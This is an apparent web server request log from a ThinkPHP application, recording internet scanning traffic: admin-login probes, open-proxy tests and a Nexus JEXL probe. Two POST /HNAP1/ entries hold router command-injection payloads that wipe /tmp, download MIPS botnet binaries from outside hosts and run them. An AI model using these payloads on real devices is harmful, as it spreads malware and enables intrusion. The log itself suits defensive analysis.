---------------------------------------------------------------
[ 2020-12-29T02:33:47+08:00 ] 85.90.247.155 GET /
[运行时间：0.010155s] [吞吐率：98.47req/s] [内存消耗：488.74kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2020-12-29T03:01:53+08:00 ] 45.155.205.108 GET 113.104.218.134:8081/
[运行时间：0.011347s] [吞吐率：88.13req/s] [内存消耗：490.89kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'authorization' => 'Basic YWRtaW46cGFzcw==',
  'content-type' => 'application/json',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2020-12-29T03:01:53+08:00 ] 45.155.205.108 GET 113.104.218.134:8081/jars
[运行时间：0.011347s] [吞吐率：88.13req/s] [内存消耗：498.12kb] [文件加载：76]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'content-type' => 'application/json',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/jars' => '',
)
---------------------------------------------------------------
[ 2020-12-29T03:01:53+08:00 ] 45.155.205.108 GET 113.104.218.134:8081/padmin/adminlogin/index.html
[运行时间：0.003076s] [吞吐率：325.11req/s] [内存消耗：486.55kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'content-type' => 'application/json',
  'referer' => 'http://113.104.218.134:8081/jars',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2020-12-29T03:01:53+08:00 ] 45.155.205.108 POST 113.104.218.134:8081/service/extdirect
[运行时间：0.003261s] [吞吐率：306.65req/s] [内存消耗：469.13kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'content-length' => '293',
  'content-type' => 'application/json',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/service/extdirect' => '',
  'action' => 'coreui_Component',
  'data' => 
  array (
    0 => 
    array (
      'filter' => 
      array (
        0 => 
        array (
          'property' => 'repositoryName',
          'value' => '*',
        ),
        1 => 
        array (
          'property' => 'expression',
          'value' => '1==1',
        ),
        2 => 
        array (
          'property' => 'type',
          'value' => 'jexl',
        ),
      ),
      'limit' => '50',
      'page' => '1',
      'sort' => 
      array (
        0 => 
        array (
          'direction' => 'ASC',
          'property' => 'name',
        ),
      ),
      'start' => '0',
    ),
  ),
  'method' => 'previewAssets',
  'tid' => '18',
  'type' => 'rpc',
)
---------------------------------------------------------------
[ 2020-12-29T03:01:54+08:00 ] 45.155.205.108 GET 113.104.218.134:8081/padmin/adminlogin/index.html
[运行时间：0.002765s] [吞吐率：361.67req/s] [内存消耗：486.88kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'authorization' => 'Basic YWRtaW46cGFzcw==',
  'content-type' => 'application/json',
  'referer' => 'http://113.104.218.134:8081/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2020-12-29T03:17:11+08:00 ] 111.175.147.243 POST /HNAP1/
[运行时间：0.003262s] [吞吐率：306.56req/s] [内存消耗：494.17kb] [文件加载：76]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-type' => 'text/xml; charset="utf-8"',
  'soapaction' => 'http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://45.145.185.74/bins/Astra.mips && chmod +x Astra.mips; ./Astra.mips hnap.rep`',
  'content-length' => '640',
)
[ info ] [ PARAM ] array (
  '/HNAP1/' => '',
  '<?xml_version' => '&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;AddPortMapping xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;&lt;PortMappingDescription&gt;foobar&lt;/PortMappingDescription&gt;&lt;InternalClient&gt;192.168.0.100&lt;/InternalClient&gt;&lt;PortMappingProtocol&gt;TCP&lt;/PortMappingProtocol&gt;&lt;ExternalPort&gt;1234&lt;/ExternalPort&gt;&lt;InternalPort&gt;1234&lt;/InternalPort&gt;&lt;/AddPortMapping&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;

',
)
---------------------------------------------------------------
[ 2020-12-29T03:29:30+08:00 ] 182.138.137.94 HEAD 123.125.114.144http://123.125.114.144/
[运行时间：0.003397s] [吞吐率：294.38req/s] [内存消耗：492.67kb] [文件加载：76]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '123.125.114.144',
  'proxy-authorization' => 'Basic Og==',
  'proxy-connection' => 'Keep-Alive',
  'accept-encoding' => 'gzip, deflate, sdch',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'user-agent' => 'Mozilla/5.01717655 Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20',
  'cache-control' => 'max-age=0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2020-12-29T03:29:30+08:00 ] 182.138.137.94 HEAD 123.125.114.144http://123.125.114.144/padmin/adminlogin/index.html
[运行时间：0.002716s] [吞吐率：368.18req/s] [内存消耗：482.34kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '123.125.114.144',
  'proxy-authorization' => 'Basic Og==',
  'proxy-connection' => 'Keep-Alive',
  'accept-encoding' => 'gzip, deflate, sdch',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'user-agent' => 'Mozilla/5.01717655 Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20',
  'cache-control' => 'max-age=0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2020-12-29T03:31:28+08:00 ] 223.166.75.92 GET www.123cha.comhttp://www.123cha.com/
[运行时间：0.003270s] [吞吐率：305.82req/s] [内存消耗：491.24kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.123cha.com',
  'proxy-authorization' => 'Basic Og==',
  'proxy-connection' => 'Keep-Alive',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2020-12-29T03:31:28+08:00 ] 223.166.75.92 GET www.123cha.comhttp://www.123cha.com/padmin/adminlogin/index.html
[运行时间：0.002749s] [吞吐率：363.77req/s] [内存消耗：487.69kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'www.123cha.com',
  'proxy-authorization' => 'Basic Og==',
  'proxy-connection' => 'Keep-Alive',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2020-12-29T03:31:29+08:00 ] 116.1.220.131 CONNECT www.voanews.com:443www.voanews.com:443
[运行时间：0.002660s] [吞吐率：375.93req/s] [内存消耗：356.60kb] [文件加载：61]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ error ] [8]未定义数组索引: connect[/var/www/html/compmgmt/thinkphp/library/think/route/RuleGroup.php:208]
---------------------------------------------------------------
[ 2020-12-29T03:31:30+08:00 ] 121.57.231.180 GET www.rfa.orghttp://www.rfa.org/english/
[运行时间：0.002590s] [吞吐率：386.11req/s] [内存消耗：498.48kb] [文件加载：76]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'www.rfa.org',
  'proxy-authorization' => 'Basic Og==',
  'proxy-connection' => 'Keep-Alive',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
)
[ info ] [ PARAM ] array (
  '/english/' => '',
)
---------------------------------------------------------------
[ 2020-12-29T03:31:30+08:00 ] 121.57.231.180 GET www.rfa.orghttp://www.rfa.org/padmin/adminlogin/index.html
[运行时间：0.002623s] [吞吐率：381.23req/s] [内存消耗：487.63kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'www.rfa.org',
  'proxy-authorization' => 'Basic Og==',
  'proxy-connection' => 'Keep-Alive',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2020-12-29T03:31:33+08:00 ] 113.128.105.118 GET www.minghui.orghttp://www.minghui.org/
[运行时间：0.003188s] [吞吐率：313.66req/s] [内存消耗：491.24kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.minghui.org',
  'proxy-authorization' => 'Basic Og==',
  'proxy-connection' => 'Keep-Alive',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2020-12-29T03:31:34+08:00 ] 223.166.75.141 CONNECT www.ipip.net:443www.ipip.net:443
[运行时间：0.002213s] [吞吐率：451.88req/s] [内存消耗：355.40kb] [文件加载：61]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ error ] [8]未定义数组索引: connect[/var/www/html/compmgmt/thinkphp/library/think/route/RuleGroup.php:208]
---------------------------------------------------------------
[ 2020-12-29T03:31:34+08:00 ] 123.160.233.128 CONNECT cn.bing.com:443cn.bing.com:443
[运行时间：0.002151s] [吞吐率：464.90req/s] [内存消耗：355.39kb] [文件加载：61]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ error ] [8]未定义数组索引: connect[/var/www/html/compmgmt/thinkphp/library/think/route/RuleGroup.php:208]
---------------------------------------------------------------
[ 2020-12-29T03:31:35+08:00 ] 113.128.105.118 GET www.minghui.orghttp://www.minghui.org/padmin/adminlogin/index.html
[运行时间：0.002708s] [吞吐率：369.28req/s] [内存消耗：487.69kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'www.minghui.org',
  'proxy-authorization' => 'Basic Og==',
  'proxy-connection' => 'Keep-Alive',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2020-12-29T03:31:35+08:00 ] 124.235.138.69 GET www.epochtimes.comhttp://www.epochtimes.com/
[运行时间：0.002476s] [吞吐率：403.88req/s] [内存消耗：491.26kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.epochtimes.com',
  'proxy-authorization' => 'Basic Og==',
  'proxy-connection' => 'Keep-Alive',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2020-12-29T03:31:36+08:00 ] 59.173.155.214 GET boxun.comhttp://boxun.com/
[运行时间：0.006864s] [吞吐率：145.69req/s] [内存消耗：491.91kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'boxun.com',
  'proxy-authorization' => 'Basic Og==',
  'proxy-connection' => 'Keep-Alive',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2020-12-29T03:31:36+08:00 ] 59.173.155.214 GET boxun.comhttp://boxun.com/padmin/adminlogin/index.html
[运行时间：0.003001s] [吞吐率：333.23req/s] [内存消耗：487.59kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'boxun.com',
  'proxy-authorization' => 'Basic Og==',
  'proxy-connection' => 'Keep-Alive',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2020-12-29T03:31:36+08:00 ] 124.235.138.69 GET www.epochtimes.comhttp://www.epochtimes.com/padmin/adminlogin/index.html
[运行时间：0.002609s] [吞吐率：383.29req/s] [内存消耗：487.83kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'www.epochtimes.com',
  'proxy-authorization' => 'Basic Og==',
  'proxy-connection' => 'Keep-Alive',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2020-12-29T03:31:37+08:00 ] 175.184.164.41 CONNECT www.baidu.com:443www.baidu.com:443
[运行时间：0.002176s] [吞吐率：459.55req/s] [内存消耗：355.40kb] [文件加载：61]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ error ] [8]未定义数组索引: connect[/var/www/html/compmgmt/thinkphp/library/think/route/RuleGroup.php:208]
---------------------------------------------------------------
[ 2020-12-29T03:31:37+08:00 ] 111.224.249.204 GET www.wujieliulan.comhttp://www.wujieliulan.com/
[运行时间：0.002405s] [吞吐率：415.81req/s] [内存消耗：491.27kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.wujieliulan.com',
  'proxy-authorization' => 'Basic Og==',
  'proxy-connection' => 'Keep-Alive',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2020-12-29T03:31:39+08:00 ] 111.224.249.204 GET www.wujieliulan.comhttp://www.wujieliulan.com/padmin/adminlogin/index.html
[运行时间：0.003135s] [吞吐率：318.98req/s] [内存消耗：487.83kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'www.wujieliulan.com',
  'proxy-authorization' => 'Basic Og==',
  'proxy-connection' => 'Keep-Alive',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2020-12-29T04:42:00+08:00 ] 139.213.27.28 POST /HNAP1/
[运行时间：0.003417s] [吞吐率：292.65req/s] [内存消耗：494.27kb] [文件加载：76]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-type' => 'text/xml; charset="utf-8"',
  'soapaction' => 'http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://usa.artillery.cf/notabotnet/notabotnet.mips && chmod +x notabotnet.mips;./notabotnet.mips hnap.selfrep`',
  'content-length' => '640',
)
[ info ] [ PARAM ] array (
  '/HNAP1/' => '',
  '<?xml_version' => '&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;AddPortMapping xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;&lt;PortMappingDescription&gt;foobar&lt;/PortMappingDescription&gt;&lt;InternalClient&gt;192.168.0.100&lt;/InternalClient&gt;&lt;PortMappingProtocol&gt;TCP&lt;/PortMappingProtocol&gt;&lt;ExternalPort&gt;1234&lt;/ExternalPort&gt;&lt;InternalPort&gt;1234&lt;/InternalPort&gt;&lt;/AddPortMapping&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;

',
)
---------------------------------------------------------------
[ 2020-12-29T06:43:32+08:00 ] 101.251.238.57 GET 113.104.218.134:8081/
[运行时间：0.003067s] [吞吐率：326.05req/s] [内存消耗：489.86kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
  'accept-charset' => 'GBK,utf-8;q=0.7,*;q=0.3',
  'accept' => 'application/json, text/plain, */*',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2020-12-29T06:43:35+08:00 ] 101.251.238.57 GET 113.104.218.134:8081/
[运行时间：0.002981s] [吞吐率：335.46req/s] [内存消耗：489.86kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
  'accept-charset' => 'GBK,utf-8;q=0.7,*;q=0.3',
  'accept' => 'application/json, text/plain, */*',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
